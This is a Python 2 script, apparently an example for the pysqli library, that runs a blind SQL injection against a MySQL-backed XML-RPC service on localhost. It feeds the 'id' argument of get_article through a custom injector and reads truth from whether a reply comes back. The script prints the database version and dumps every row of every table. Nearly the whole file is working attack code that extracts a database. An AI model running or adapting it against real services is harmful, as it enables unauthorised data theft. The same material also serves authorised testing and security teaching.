import xmlrpclib
from pysqli import Mysql5, BlindContext
from pysqli.core.injector import ContextBasedInjector

class XmlRpcInjector(ContextBasedInjector):
    def __init__(self, context, server, port):
        super(XmlRpcInjector, self).__init__(context)
        self.proxy = xmlrpclib.ServerProxy("http://localhost:8000/")

    def process_injection(self, parameters):
        '''
        Target arg is 'id'
        '''
        res = self.proxy.get_article(parameters['id'])
        return (res != '')

c = BlindContext(
        params = {
            'id':'1',
        },
        field_type=BlindContext.FIELD_INT,
        default='1',
        target='id',
        multithread=False
)

m = Mysql5.custom(XmlRpcInjector, c, 'localhost',8000)
print m.version()
for table in m.database().tables():
    print 'Dumping %s ...' % table
    for row in table.all():
        print row

